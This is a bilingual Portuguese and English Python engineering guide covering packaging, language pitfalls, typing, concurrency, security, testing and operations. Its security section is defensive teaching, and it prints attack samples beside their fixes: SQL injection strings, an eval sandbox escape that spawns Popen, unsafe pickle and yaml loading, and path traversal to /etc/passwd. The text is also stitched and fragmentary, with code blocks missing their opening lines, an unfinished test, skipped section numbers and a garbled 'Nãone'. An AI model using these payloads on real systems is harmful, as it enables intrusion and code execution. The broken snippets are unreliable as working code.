Se a reconstrução falhar numa máquina com o mesmo sistema operativo e a mesma versão de Python, o teu ficheiro de dependências está incompleto — normalmente porque algo foi instalado à mão e nunca registado. É um bug que vale a pena corrigir já, enquanto ainda te lembras do que escreveste.

Bad decision — "I'll just use --break-system-packages, it worked last time" The flag does not make the install safe; it removes the guard. pip writes into /usr/lib/python3/dist-packages or ~/.local/lib, files the OS package manager has no record of. Later, apt upgrade overwrites a dependency and your package half-breaks; or your upgraded library breaks a system daemon at boot. On Debian/Ubuntu, the distro explicitly asks you to contact them rather than override. If you need a library the distro does not ship, the supported answers are, in order: a venv for your project, pipx for an application, uv tool for the same thing faster, a container for isolation, or building a package. Reserve the override for a throwaway container you are about to delete — and if you truly must, do it with --dry-run first, record the exact packages, and expect the next distro upgrade to be painful.
Bad decision — deleting EXTERNALLY-MANAGED Tempting, and worse than the flag: it silently disables the protection for every future pip invocation on that machine, including the ones run by scripts and by you six months from now. It also gets restored by package updates, so the "fix" is unstable. If you find yourself wanting to delete it, the environment is the problem — not the marker.

Essenciais da linguagem que realmente mordem

Não precisas de memorizar a gramática. Precisas da dúzia de semânticas que causam bugs em produção: mutabilidade, ligação de nomes, âmbito de excepções e a diferença entre «funciona» e «correcto».

Este nível não é um tutorial de principiantes — é o conjunto de factos que os programadores de Python experientes gostariam de ter ouvido mais cedo. Todos os exemplos são executáveis e cada um corresponde a uma classe real de bug.

1. Os nomes são etiquetas, não caixas

A atribuição liga um nome a um objecto. Nunca copia. Este único facto explica o aliasing, os valores por omissão mutáveis e metade de todas as perguntas «porque é que a minha lista mudou?».

python · aliasing
a = [1, 2, 3]
b = a              # same object, two names
b.append(4)
print(a)           # [1, 2, 3, 4]  <- not a copy
print(a is b)      # True

c = a[:]           # shallow copy: new list, same element objects
print(a is c, a == c)   # False True

import copy
d = copy.deepcopy(a)    # recursive copy; needed for nested mutables
is vs == == asks "do these compare equal?" and calls __eq__. is asks "are these the same object?" and compares identity. Use is only for Nãone, True, False, and sentinels you created. if x is 1000 may be true on one interpreter and false on another because small-integer caching is an implementation detail. The CPython REPL makes it worse by caching the last expression, so a test can pass interactively and fail in a script.

2. A armadilha do argumento por omissão mutável

Broken
def add_item(item, bucket=[]):
    bucket.append(item)
    return bucket

print(add_item("a"))   # ['a']
print(add_item("b"))   # ['a', 'b']  !!
Default expressions are evaluated once, when the def executes. Every call shares the same list.
Correct
def add_item(item, bucket=None):
    if bucket is None:
        bucket = []
    bucket.append(item)
    return bucket

# Or, when a shared default is intentional:
def add_item(item, bucket=()):
    return [*bucket, item]
Use None as the sentinel, or an immutable type. Never a list, dict or set.

3. Excepções: âmbito, encadeamento e o que não apanhar

python · a small, honest exception hierarchy
class InventoryError(Exception):
    """Base class for all inventory failures."""

class SkuNotFound(InventoryError):
    def __init__(self, sku: str) -> None:
        super().__init__(f"unknown SKU: {sku!r}")
        self.sku = sku

def look_up(sku: str, catalog: dict[str, int]) -> int:
    try:
        return catalog[sku]
    except KeyError as exc:
        raise SkuNotFound(sku) from exc     # explicit cause, never silent

try:
    look_up("nope", {"abc": 3})
except SkuNotFound as exc:
    print(exc.sku, "->", exc)               # nope -> unknown SKU: 'nope'
except InventoryError:
    raise                                  # re-raise: you cannot handle it

Regras que evitam incidentes reais:

  • Apanha a excepção mais estreita que consegues mesmo tratar. except Exception: pass é como as avarias se escondem.
  • Usa raise … from exc para preservar a causa. Perder a cadeia transforma uma correcção de cinco minutos numa tarde.
  • else corre quando não houve excepção; finally corre sempre. Um return dentro de finally engole excepções — nunca o faças.
  • As mensagens de excepção são para humanos; os tipos de excepção são para o código. Não faças parsing de mensagens.
  • Nunca uses excepções para fluxo de controlo normal em ciclos quentes; usa dict.get, getattr(obj, name, default) ou uma verificação explícita.
Bad decision — try: ... except Exception: pass It converts a loud, locatable failure into a silent wrong answer. A web handler that swallows exceptions returns 200 with corrupt data; a cron job that swallows exceptions exits 0 and nobody notices for a week. If you must catch broadly at a boundary (a worker loop, a request handler), log with a stack trace (logger.exception(...)) and either re-raise or return a defined failure result. "Óptimo effort" code still has to report that it gave up.

5. Modelação de dados com dataclasses

Recorre a @dataclass antes de escreveres à mão uma classe com __init__, __repr__ e __eq__. Acrescenta frozen=True para objectos de valor, slots=True para memória e field(default_factory=...) para campos mutáveis.

python · a validated value object
from dataclasses import dataclass, field
from datetime import datetime
from decimal import Decimal

@dataclass(frozen=True, slots=True)
class LineItem:
    sku: str
    qty: int
    unit_price: Decimal
    tags: tuple[str, ...] = ()

    def __post_init__(self) -> None:
        if self.qty <= 0:
            raise ValueError(f"qty must be positive, got {self.qty}")
        if self.unit_price < 0:
            raise ValueError("unit_price cannot be negative")

    @property
    def total(self) -> Decimal:
        return self.unit_price * self.qty

item = LineItem(sku="A-100", qty=3, unit_price=Decimal("19.99"))
print(item)              # LineItem(sku='A-100', qty=3, unit_price=Decimal('19.99'), tags=())
print(item.total)        # 59.97
# item.qty = 4           # FrozenInstanceError: immutable by design

Porque Decimal para dinheiro: 0.1 + 0.2 == 0.30000000000000004 em vírgula flutuante binária. Para preços, usa Decimal a partir de strings (nunca a partir de um float) ou cêntimos inteiros.

6. Iteração, compreensões e geradores

python · lazy pipelines
from pathlib import Path
from itertools import batched
import re

LOG = re.compile(r"^(?P<ip>\S+) \S+ \S+ \[[^\]]+\] \"(?P<verb>\w+) (?P<path>\S+)")

def parsed_lines(path: Path):
    """Yield parsed records lazily - constant memory, even for 10 GB files."""
    with path.open(encoding="utf-8", errors="replace") as fh:
        for line in fh:
            if m := LOG.match(line):
                yield m.groupdict()

counts: dict[str, int] = {}
for rec in parsed_lines(Path("access.log")):
    counts[rec["path"]] = counts.get(rec["path"], 0) + 1

top = sorted(counts.items(), key=lambda kv: kv[1], reverse=True)[:5]

for group in batched(top, 2):      # 3.12+: fixed-size tuples
    print(group)

Prefere geradores para tudo o que possa ser maior do que a memória. Uma compreensão materializa uma lista; uma expressão geradora não: sum(x*x for x in range(10**7)) está bem, sum([x*x for x in range(10**7)]) aloca centenas de megabytes.

7. Gestores de contexto: limpeza que não se esquece

python · files, locks, transactions
from contextlib import contextmanager, suppress
import sqlite3, time

@contextmanager
def timed(label: str):
    start = time.perf_counter()
    try:
        yield
    finally:
        print(f"{label}: {time.perf_counter() - start:.3f}s")

with timed("import"), suppress(FileNotFoundError):
    with open("optional.csv", encoding="utf-8") as fh:
        rows = fh.read().splitlines()

# sqlite3 connections are context managers for *transactions*, not for closing:
with sqlite3.connect("app.db") as conn:
    conn.execute("CREATE TABLE IF NOT EXISTS kv (k TEXT PRIMARY KEY, v TEXT)")
    conn.execute("INSERT OR REPLACE INTO kv VALUES (?, ?)", ("build", "2026.10"))

Usa with para todos os recursos: ficheiros, sockets, ligações e transacções de base de dados, locks, directórios temporários (tempfile.TemporaryDirectory) e membros de arquivo. Se um tutorial abre um ficheiro sem with, está a ensinar-te uma fuga.

8. Tipagem que se paga a si mesma

As anotações de tipo não afectam o desempenho em execução e não são impostas em execução. O valor delas está nos editores e na CI: as refactorizações tornam-se mecânicas e metade dos bugs de «forma de dados errada» nunca chega a sair. Começa pelas assinaturas das funções públicas; não anotes cada variável local.

python · 3.12+ syntax
from collections.abc import Iterable, Iterator
from dataclasses import dataclass
from typing import Literal, Protocol, TypeAlias

type Json = None | bool | int | float | str | list["Json"] | dict[str, "Json"]

class Repository(Protocol):
    def get(self, key: str) -> bytes | None: ...
    def put(self, key: str, value: bytes) -> None: ...

@dataclass
class Cache:
    store: Repository
    mode: Literal["read", "write", "readwrite"] = "readwrite"

    def warm(self, keys: Iterable[str]) -> Iterator[str]:
        for key in keys:
            if self.store.get(key) is not None:
                yield key

def head[T](items: Iterable[T], n: int = 1) -> list[T]:   # PEP 695 generics
    return [item for _, item in zip(range(n), items)]
bash · enforce in CI
mypy --strict src/          # strict from day one on new code

ruff check --select ANN     # flags missing annotations, if you want that
Why Protocol instead of inheritance Python is structurally typed. A Protocol says "anything with these methods qualifies", so your cache does not need to import — or inherit from — a base class in your framework. That keeps test doubles trivial and prevents the classic import cycle caused by an ABC. If you control the hierarchy and want nominal typing, use abc.ABC; if you are describing a capability, use Protocol.

from string.templatelib import Template, Interpolation

def sql(template: Template) -> tuple[str, list[object]]:
    """Build a parameterised query: values never become SQL text."""
    parts, params = [], []
    for item in template:
        if isinstance(item, Interpolation):
            parts.append("?")
            params.append(item.value)
        else:
            parts.append(item)
    return "".join(parts), params

user_input = "'; DROP TABLE users; --"
query, args = sql(t"SELECT * FROM users WHERE name = {user_input}")
print(query)   # SELECT * FROM users WHERE name = ?
print(args)    # ["'; DROP TABLE users; --"]

É esse o ponto das t-strings: um construtor de SQL consegue distinguir texto literal de valores interpolados ao nível da API, pelo que os bugs de quoting passam a ser estruturalmente impossíveis em vez de dependerem da revisão.

# Atomic write: never let readers see a half-written file.
def atomic_write(path: Path, data: str) -> None:
    tmp = path.with_suffix(path.suffix + ".tmp")
    with tmp.open("w", encoding="utf-8") as fh:
        fh.write(data)
        fh.flush()
        os.fsync(fh.fileno())
    os.replace(tmp, path)      # atomic on POSIX and Windows

Formatos de dados: json, csv, tomllib, configparser

import csv, json, tomllib
from pathlib import Path

# JSON: text, explicit encoding, and a clear error path.
try:
    payload = json.loads(Path("config.json").read_text(encoding="utf-8"))
except json.JSONDecodeError as exc:
    raise SystemExit(f"config.json is invalid at line {exc.lineno}, col {exc.colno}: {exc.msg}")

# Write JSON that humans and diffs can read; sort_keys makes changes reviewable.
Path("out.json").write_text(json.dumps(payload, indent=2, sort_keys=True) + "\n", encoding="utf-8")

    writer = csv.DictWriter(fh, fieldnames=["sku", "qty", "note"])
    writer.writeheader()
    writer.writerow({"sku": "A-100", "qty": 3, "note": "has, comma"})
    writer.writerow({"sku": "B-200", "qty": 1, "note": 'quoted "text"'})

Why not parse CSV with line.split(",") Because CSV is not "commas separated values" — it is a quoting format. Fields can contain commas, newlines, and doubled quotes. Splitting by comma silently corrupts addresses ("Springfield, IL"), multi-line notes, and Excel exports. The csv module handles dialects, quoting, and embedded newlines, and reads a file incrementally. The same reasoning applies to JSON (use json, never regex), TOML, and YAML (yaml.safe_load, Level 07).

Concorrência: threads, processos e asyncio

python · pick the right concurrency model
from concurrent.futures import ThreadPoolExecutor, ProcessPoolExecutor
import asyncio, httpx, time

URLS = [f"https://example.com/{i}" for i in range(20)]

# I/O-bound, sync code: threads. Simple, bounded, no event loop.
def fetch_all_sync() -> list[int]:
    def one(url: str) -> int:
        with httpx.Client(timeout=5.0, follow_redirects=False) as client:
            return client.get(url).status_code
    with ThreadPoolExecutor(max_workers=8) as pool:
        return list(pool.map(one, URLS))

# CPU-bound: processes. Each worker gets its own GIL.
def cpu_task(n: int) -> int:
    return sum(i * i for i in range(n))

def crunch() -> list[int]:
    with ProcessPoolExecutor(max_workers=4) as pool:
        return list(pool.map(cpu_task, [2_000_000] * 4))

# I/O-bound, async: one thread, explicit concurrency limit.
async def fetch_all_async() -> list[int]:
    limits = httpx.Limits(max_connections=10)
    async with httpx.AsyncClient(timeout=5.0, limits=limits) as client:
        results = await asyncio.gather(*(client.get(u) for u in URLS))
        return [r.status_code for r in results]

# 3.11+: structured concurrency, cancels siblings on failure.
async def main() -> None:
    async with asyncio.TaskGroup() as tg:
        for url in URLS[:3]:
            tg.create_task(httpx.AsyncClient(timeout=5).get(url))

if __name__ == "__main__":
    t0 = time.perf_counter()
    print(fetch_all_sync()[:3], f"{time.perf_counter() - t0:.2f}s")
    print(asyncio.run(fetch_all_async())[:3])

Segurança: os padrões não estão do teu lado

O Python dá-te ferramentas afiadas e poucas guardas. Os padrões perigosos são curtos, idiomáticos e copiados pela internet fora. Este nível mostra cada um ao lado da correcção e explica o que um atacante faz mesmo com ele.

O trabalho de segurança começa num modelo de ameaças, não numa lista de verificação. Faz três perguntas por cada programa: que dados atravessam uma fronteira de confiança? (rede, ficheiros, saída de subprocessos, ambiente), o que pode um atacante controlar? e qual é o pior resultado se essa entrada for hostil? Depois desenha de forma a que o pior resultado não seja alcançável.

1. Valida a entrada pela estrutura, não por listas negras

Blocklist — always incomplete
name = request.args["name"]
if "'" in name or ";" in name:
    abort(400)
# Unicode, encoding, numeric context,
# and second-order injection all bypass it.
Allowlist + parse
import re
RAW = re.compile(r"\A[A-Za-z0-9_-]{1,32}\Z")

def parse_username(raw: str) -> str:
    if not RAW.fullmatch(raw):
        raise ValueError("invalid username")
    return raw
Define the exact shape you accept, then reject everything else. Length limits are security controls.

Valida na fronteira (handler HTTP, parser de CLI, leitor de ficheiros) e depois passa valores já tipados para dentro. Não voltes a validar em todas as camadas e nunca «higienizes» a remover caracteres: estragar a entrada cria bugs novos e não trava injecção. Faz o parsing numa representação segura ou rejeita-a.

Size is an attack surface Unbounded reads are a denial-of-service primitive: a 10 GB JSON body, a zip bomb, a regex with catastrophic backtracking, an image with huge dimensions. Enforce maximum content length at the proxy and in code; stream large payloads; set timeouts on all network calls; bound loops that consume user-controlled collections.

2. Injecção: quatro sítios onde se esconde

SQL

String interpolation = SQL injection
sku = request.args["sku"]
cur.execute(f"SELECT * FROM items WHERE sku = '{sku}'")
# sku = "x' OR '1'='1"  -> dumps the table
# sku = "x'; DROP TABLE items; --" -> gone
Bound parameters
cur.execute("SELECT * FROM items WHERE sku = ?", (sku,))
# Identifiers cannot be bound. Allowlist them:
SORT = {"name": "name", "price": "unit_price"}
order = SORT.get(request.args.get("sort"), "name")
cur.execute(f"SELECT * FROM items ORDER BY {order}")

A ligação de parâmetros só serve para valores. Nomes de colunas, de tabelas e ASC/DESC têm de vir de uma lista fixa — nunca da entrada, nem com quoting. Os ORMs ajudam mas não te salvam: .raw(), .extra() e text() com concatenação reabrem o buraco.

Shell

subprocess.run(["convert", filename, "-resize", "50%", "out.png"], check=True, timeout=30)

Sistema de ficheiros

python · path traversal
from pathlib import Path

BASE = Path("/srv/reports").resolve()

def safe_report(name: str) -> Path:
    # "..." and absolute paths are the attack: Path(BASE) / "/etc/passwd" == Path("/etc/passwd")
    candidate = (BASE / name).resolve()
    if not candidate.is_relative_to(BASE):
        raise PermissionError("path escapes base directory")
    if candidate.suffix not in {".pdf", ".csv"}:
        raise PermissionError("unsupported file type")
    return candidate

Duas subtilezas: os.path.join("/srv", "/etc/passwd") devolve /etc/passwd porque um segundo argumento absoluto substitui a base, e os segmentos .. são resolvidos pelo sistema operativo depois da tua verificação, a menos que faças resolve(). As ligações simbólicas dentro da base também são uma fuga — resolve() trata delas, e é por isso que aqui não é opcional.

Logs e cabeçalhos

Entrada de utilizador com \n pode forjar linhas de log; entrada de utilizador em cabeçalhos de resposta permite injecção de cabeçalhos; entrada de utilizador no assunto de um email pode injectar cabeçalhos. Normaliza e codifica no destino, e prefere logs JSON estruturados à formatação de strings. Nunca ponhas entrada crua em eval, exec, format_map sobre templates não confiáveis, ou numa shell.

3. Desserialização: a linha mais perigosa do Python

Remote code execution, by design
import pickle, yaml

# Both of these execute attacker-chosen code.
obj = pickle.loads(request.data)

cfg = yaml.load(request.data, Loader=yaml.Loader)

# marshal is also unsafe and not for persistence.
pickle is a program format, not a data format. Its docs say so explicitly. There is no safe subset for untrusted input, and no amount of validation makes it safe.
Data formats + signature checks
import json, yaml, hmac, hashlib

obj = json.loads(request.data)       # data only

cfg = yaml.safe_load(request.data)   # safe subset

# If data must be authenticated, verify an HMAC
# over the raw bytes before parsing:
expected = hmac.new(secret, body, hashlib.sha256).hexdigest()
if not hmac.compare_digest(expected, header_sig):
    raise PermissionError("bad signature")
Trust the bytes only after an authenticated channel. Same rule for tarfile, zipfile, models, and caches.
Why yaml.safe_load is not paranoia Full YAML supports application-specific tags, including Python object construction. A crafted document can instantiate arbitrary objects and, through them, execute commands. safe_load restricts parsing to plain data types. If you need a custom tag, register an explicit constructor for it and treat the input as code. The same reasoning applies to json with a custom object_hook that imports or calls things — JSON itself is data, your hook can make it code.

4. eval, exec e «é só uma calculadora»

python · why eval cannot be sandboxed by filtering
# Attacker input, even with no imports allowed and empty builtins:
payload = "[c for c in ().__class__.__base__.__subclasses__() if c.__name__ == 'Popen'][0](['id'])"

# __builtins__ can be reached through object introspection, so restricting
# the globals dict does not create a security boundary.
eval(payload, {"__builtins__": {}})

# Legitimate alternative for arithmetic:
import ast, operator

OPS = {ast.Add: operator.add, ast.Sub: operator.sub,
       ast.Mult: operator.mul, ast.Div: operator.truediv}

def calc(expr: str) -> float:
    def ev(node):
        if isinstance(node, ast.Expression):
            return ev(node.body)
        if isinstance(node, ast.Constant) and isinstance(node.value, (int, float)):
            return node.value
        if isinstance(node, ast.BinOp) and type(node.op) in OPS:
            return OPS[type(node.op)](ev(node.left), ev(node.right))
        raise ValueError("unsupported expression")
    return ev(ast.parse(expr, mode="eval"))

Se precisas mesmo de correr código não confiável, precisas de uma fronteira ao nível do sistema operativo: um contentor sem rede, sistema de ficheiros só de leitura, utilizador não root, capabilities removidas e limites de CPU, memória e tempo. As «sandboxes» do próprio Python (RestrictedPython, builtins vazios, filtros de ast) são medidas de endurecimento para código semi-confiável, não fronteiras de segurança. Trata qualquer alegação em contrário como um relatório de vulnerabilidade à espera de acontecer.

5. Rede: TLS, timeouts e SSRF

What not to ship
import requests

requests.get(url, verify=False)     # no certificate check
requests.get(url)                   # no timeout: hangs forever
requests.get(url, allow_redirects=True)  # SSRF pivot
urllib.request.urlopen(url)         # also no timeout by default
Verified, bounded, explicit
import httpx

with httpx.Client(
    verify=True,             # default; do not disable
    timeout=httpx.Timeout(5.0, connect=2.0),
    follow_redirects=False,  # decide per call
    headers={"User-Agent": "inventory/2.1"},
) as client:
    resp = client.get(url)
    resp.raise_for_status()

SSRF (server-side request forgery) é a que as pessoas deixam passar: se um utilizador fornece um URL que o teu servidor vai buscar, pode chegar a 169.254.169.254 (metadados da cloud), a painéis de administração em localhost ou a hosts internos da RFC 1918. Valida o IP resolvido, rejeita gamas privadas e link-local, desactiva redireccionamentos (ou revalida cada salto) e usa um proxy de saída para tudo o que é conduzido pelo utilizador.

Why disabling verification is never a fix verify=False turns TLS into an obfuscation layer: any on-path attacker can impersonate the server and read or modify traffic, including credentials and tokens. If you see certificate errors, the cause is a missing/expired CA or a wrong hostname — fix the trust store (certifi, your corporate CA, SSL_CERT_FILE), not the check. The same applies to --trusted-host in pip and --insecure in curl: they are incident markers, not configuration.

7. Ficheiros, arquivos, XML

python · archive extraction (zip-slip / tar-slip)
import tarfile, zipfile
from pathlib import Path

DEST = Path("/srv/imports").resolve()

# Python 3.14+ defaults tarfile to filter="data"; older versions need it explicitly.
with tarfile.open("upload.tar.gz") as tf:
    for member in tf.getmembers():
        target = (DEST / member.name).resolve()
        if not target.is_relative_to(DEST) or member.issym() or member.islnk():
            raise PermissionError(f"unsafe archive member: {member.name}")
    tf.extractall(DEST, filter="data")

Impõe também um tamanho máximo descomprimido (zip bombs), um número máximo de membros e um orçamento total de tempo. Extrair é fazer parsing de um formato hostil com os teus privilégios — trata-o como tal.

Os parsers de XML podem resolver entidades externas (XXE: ler ficheiros locais, fazer pedidos) e expandir entidades exponencialmente («billion laughs»). Usa defusedxml para documentos não confiáveis, ou uma configuração de parser endurecida. O json não é vulnerável a essas duas, e é uma razão para o preferir em APIs internas.

9. Especificidades de aplicações web

  • Nunca implantes com o debug ligado. O DEBUG=True do Django vaza configurações (incluindo segredos em tracebacks); o depurador interactivo do Flask/Werkzeug é uma consola de execução remota de código, se for alcançável. Está protegido por um PIN, e o PIN deriva-se dos detalhes da máquina.
  • Templates com escape automático. O Jinja2 escapa HTML por omissão em ficheiros .html; |safe, Markup e render_template_string com entrada de utilizador desfazem isso. Injecção de templates do lado do servidor é RCE, não XSS.
  • CSRF e cookies. Usa a protecção CSRF do framework para pedidos que mudam estado; define os cookies HttpOnly, Secure e SameSite=Lax/Strict.
  • Redireccionamentos abertos. Valida next/return_to como caminhos relativos; permite hosts por lista explícita.
  • Tratamento de erros. Devolve uma página 500 genérica; regista o traceback do lado do servidor com um ID de pedido. Os stack traces nas respostas revelam caminhos, versões e por vezes segredos.
  • CORS. * com credenciais é inválido; permite origens por lista explícita. O CORS não é controlo de acesso para chamadas servidor-a-servidor.

Testes e qualidade: prova em vez de esperança

Os testes são documentação executável de decisões. Bem feitos, deixam-te mudar código depressa; mal feitos, fixam detalhes de implementação e falham por razões irrelevantes.

from unittest.mock import patch
import httpx
from shop.rates import fetch_rate

def test_fetch_rate_retries_once_on_503(monkeypatch):
    calls = {"n": 0}
    real_client = httpx.Client

    def fake_get(self, url, **kwargs):
        calls["n"] += 1
        request = httpx.Request("GET", url)
        status = 503 if calls["n"] == 1 else 200
        return httpx.Response(status, json={"rate": "1.10"}, request=request)

Why patching the transport beats patching your own function monkeypatch.setattr(shop.rates, "_get", fake) tests that fetch_rate calls a function named _get — an implementation detail. Testes baseados em propriedades com Hypothesis

Os testes por exemplo verificam os casos em que pensaste. O Hypothesis gera os que não pensaste: listas vazias, inteiros enormes, casos-limite de unicode, NaN, zero negativo.

O Hypothesis reduz as falhas ao exemplo mais pequeno e imprime uma seed reproduzível. Guarda o caso falhado como teste de regressão; a seed é valiosa, mas o exemplo mínimo é documentação.

Bibliotecas por objectivo, e como avaliar uma em dez minutos

O PyPI tem mais de meio milhão de projectos. A competência não é memorizá-los — é ter um protocolo repetível para decidir se um pacote merece viver na tua árvore de dependências.

Uma dependência é uma relação de longo prazo: herdas os seus bugs, o seu ritmo de releases, a sua licença, a sua árvore transitiva e a sua postura de segurança. Encarar a sua adição como uma contratação, não como uma compra.

O protocolo de avaliação de dez minutos

  1. Lê a página do PyPI, não o README no GitHub. O PyPI mostra os metadados publicados: versão, data de release, Requires-Python, licença, classificadores, URLs do projecto e as dependências declaradas. O GitHub mostra o que o mantenedor quer que vejas.
  2. Verifica o ritmo de releases e os números de versão. Uma release há três anos é um aviso; uma versão 0.x é um aviso de estabilidade de API. Nenhum dos dois desqualifica, mas ambos mudam a tua estratégia de fixação.
  3. Olha para a árvore de dependências. O uv tree ou o pip install --dry-run mostram o que vem atrás. Uma biblioteca «pequena» que arrasta 40 pacotes não é pequena.
  4. Confirma que existem wheels para a tua plataforma e versão de Python. Sem wheel significa build a partir do código-fonte, e isso significa compiladores e cabeceiras do sistema na CI e em produção.
  5. Verifica a tipagem e a documentação. Um marcador py.typed mais documentação real de API significa que o teu editor te pode ajudar; documentação só de stubs autogerados é uma pista sobre maturidade.
  6. Procura no issue tracker o teu caso de uso exacto e as palavras «security», «leak», «race», «deprecated». Lê como respondem os mantenedores, não apenas se existem issues.
  7. Corre-o num ambiente descartável antes de adoptar: importa-o, chama a API de que precisas e escreve um teste. Isto apanha mentiras de empacotamento em minutos.
  8. Confirma a licença face ao teu modelo de distribuição (AGPL num SaaS, GPL num binário fechado). Depois confirma a licença das suas dependências — as licenças compõem-se.
  9. Procura um sinal de segurança. Avisos no OSV/GitHub, OpenSSF Scorecard, releases assinadas, um SECURITY.md. A ausência não é culpa, mas a presença é informação.
  10. Escreve a alternativa que rejeitaste. Uma linha no PR ou no ADR: «escolhi httpx em vez de requests por async + HTTP/2». O teu eu futuro vai precisar dela.

Porque é esta a forma: as dependências são instaladas numa camada que só muda quando o lockfile muda (reconstruções rápidas), a imagem de execução não tem compilador nem cache de build, o processo corre com um UID fixo não root, e o healthcheck usa Python em vez de assumir que o curl existe.

Bad decision — pip install -r requirements.txt at container start It makes startup depend on the network and PyPI's availability, produces a different environment every time a transitive dependency publishes, slows scaling, and requires build tools in the runtime image. It also means a rollback is not a rollback: the old image now installs new packages. Install at build time from a lockfile, tag the image with the commit SHA, and deploy that immutable artefact. The only runtime installs should be deliberate, versioned, and rare.
Bad decision — one giant requirements.txt with == everywhere and no lock semantics Pinning only direct dependencies leaves transitives floating; pinning every transitive by hand is unmaintainable and silently drops hashes. And a file produced by pip freeze from a developer's environment often contains packages nobody declared, plus local paths. Choose a real resolver (uv, Poetry, pip-tools) and let it produce the lock. Then update on a schedule with a human reviewing the diff.

import timeit, statistics, random

SETUP = "data = [random.random() for _ in range(100_000)]"

def bench(stmt: str, number: int = 20) -> tuple[float, float]:
    times = timeit.repeat(stmt, setup=SETUP, number=number, repeat=5,
                          globals={"random": random})
    return min(times) / number, statistics.median(times) / number

for stmt in ("sum(data)", "sum([x for x in data])", "sum(x for x in data)"):
    best, median = bench(stmt)
    print(f"{stmt:<28} best={best*1e3:.3f}ms median={median*1e3:.3f}ms")

As optimizações que normalmente contam

  1. Faz menos trabalho. Mata consultas N+1, faz cache de funções puras, agrupa pedidos, evita re-parsear dados imutáveis, sai cedo. Isto bate qualquer micro-optimização.
  2. Usa a estrutura de dados certa. Testes de pertença: set/dict O(1) vs list O(n). Contagem: collections.Counter. Filas: collections.deque, não list.pop(0).
  3. Empurra trabalho para código nativo. NumPy/Polars/DuckDB, agregação na base de dados, extensões C — as operações vectorizadas libertam o GIL e reduzem o custo do interpretador em ordens de grandeza.
  4. Agrupa I/O. Uma consulta com 1 000 IDs bate 1 000 consultas. Escritas com buffer batem commits por linha (commit a cada N linhas ou por lote).
  5. Faz streaming em vez de materializar. Geradores, iterparse, leituras em blocos: memória constante e melhor comportamento de cache.
  6. Paraleliza a coisa certa. Threads para I/O, processos para CPU, async para I/O de alta concorrência. Mede o ganho; a contenção e o pickling comem-no muitas vezes.

Why list.pop(0) is a bug, not a style choice Removing the first element of a Python list shifts every remaining element: O(n) per pop, O(n²) for a queue of n items. At 100,000 items that is billions of pointer moves disguised as a one-line loop. deque.popleft() is O(1). The same class of issue appears with repeated string concatenation (s += x in a loop), repeated in checks against a list, and sorted() inside a loop.

Depuração: um método, não uma intuição

  1. Reproduz de forma determinística. Mesma entrada, mesmo ambiente, mesma seed. Se não consegues reproduzir, acrescenta observabilidade até conseguires.
  2. Encolhe a entrada. Um caso mínimo que falha é 80% da correcção, e torna-se o teste de regressão.
  3. Lê o traceback todo. O último frame é onde partiu; o frame acima é normalmente porquê. As cadeias raise ... from contam.
  4. Inspecciona o estado, não adivinhes. breakpoint(), pp locals(), regista os valores reais. Os prints servem — mas que fiquem nos logs.
  5. Faz bissecção. git bisect para regressões; desactiva metade do pipeline para localizar. A pesquisa binária é mais rápida que a intuição.
  6. Corrige a causa, acrescenta um teste, depois remove a instrumentação.

        port = int(raw)
    except ValueError:

Bad decision — optimising before profiling Intuition about performance is wrong often enough to be dangerous. Developers optimise string formatting while 90% of the time is a missing index; they add __slots__ to a class instantiated 12 times; they rewrite comprehensions while the service waits on a 400 ms upstream call. The cost is not just wasted effort: the added complexity becomes permanent, and the real bottleneck ships. Profile first, change one thing, re-measure with the same benchmark, and keep a note of the before/after. If you cannot state the metric and the delta, you have not optimised — you have edited.
Bad decision — try/except around a loop to "skip bad rows" without logging Silently skipping malformed records turns a data-quality problem into a correctness problem: reports are wrong, counts do not reconcile, and nobody knows which rows vanished. Catch the specific parse error, count it, log a sample with line numbers, and expose the count as a metric. Decide explicitly whether partial success is acceptable — and if it is, make it visible.

Sinais e encerramento gracioso

import asyncio, logging, signal

log = logging.getLogger("shop")

async def serve(stop: asyncio.Event) -> None:
    server = await asyncio.start_server(handle, "127.0.0.1", 8000)
    async with server:
        await stop.wait()
    log.info("server closed; draining")
    await asyncio.sleep(0)          # let handlers finish; add a bounded drain here

def install_signal_handlers(stop: asyncio.Event) -> None:
    loop = asyncio.get_running_loop()
    for sig in (signal.SIGTERM, signal.SIGINT):
        loop.add_signal_handler(sig, stop.set)

async def main() -> None:
    stop = asyncio.Event()
    install_signal_handlers(stop)
    await serve(stop)

#   gunicorn app:app --workers 4 --timeout 30 --graceful-timeout 30 --access-logfile -
# Do not run your own signal handlers in a prefork worker.

O que «gracioso» significa na prática: deixar de aceitar pedidos novos, terminar os que estão em curso dentro de um limite, fechar pools, esvaziar os logs, sair com 0. Se o encerramento demorar mais do que o período de tolerância do orquestrador, ele envia SIGKILL e perdes o trabalho em curso — por isso define TimeoutStopSec/--graceful-timeout abaixo da janela de kill da plataforma.

Fixa por digest, não por etiqueta. Corre com um UID numérico para que o runAsNonRoot do Kubernetes o possa verificar. Why PID 1 matters In a container, the first process is PID 1 and gets special signal semantics: the kernel ignores signals it has no handler for. If your shell script is PID 1 and does not forward SIGTERM to Python, docker stop waits out its timeout and kills the app hard. exec python ... in the entrypoint replaces the shell, so Python is PID 1 and receives signals directly.

Observabilidade: as três perguntas

logs

O que aconteceu?

JSON estruturado para stdout com data/hora, nível, logger, ID de pedido e nomes de evento estáveis. Sem segredos, sem dados pessoais. Deixa a plataforma indexar e reter.

metrics

Quanto, a que velocidade?

RED (taxa, erros, duração) para serviços; USE (utilização, saturação, erros) para recursos. Histogramas, não médias. Alerta em sintomas que os utilizadores sentem.

traces

Para onde foi o tempo?

Um trace por pedido entre serviços, com spans para a base de dados e chamadas de saída. Amostra com inteligência; guarda os erros e os pedidos lentos.

Bad decision — nohup python app.py & There is no supervision: when it crashes, nothing restarts it; when the host reboots, it is gone; logs go to a file that fills the disk; there is no resource limit, no health check, and no clean shutdown. It also runs as whoever typed the command, usually with too many privileges. Use systemd (or your orchestrator) so restart policy, limits, logging, and startup ordering are declarative. The 30 seconds you save are repaid the first time the process dies at 02:00 and nobody notices until morning.
Bad decision — logging everything to a file inside the container Container filesystems are ephemeral: the log disappears when the container is replaced, and an unbounded file can fill the writable layer and crash the node. Log to stdout/stderr, let the runtime collect and rotate, and set retention at the platform level. If you must write files, use a dedicated volume with rotation (logrotate) and a size cap.

Manutenção a longo prazo: a parte sobre a qual ninguém escreve tutoriais

O software passa a maior parte da vida depois da primeira release. O Python avança a um ritmo anual previsível, as dependências desviam-se, e a única defesa é um processo aborrecido e calendarizado.

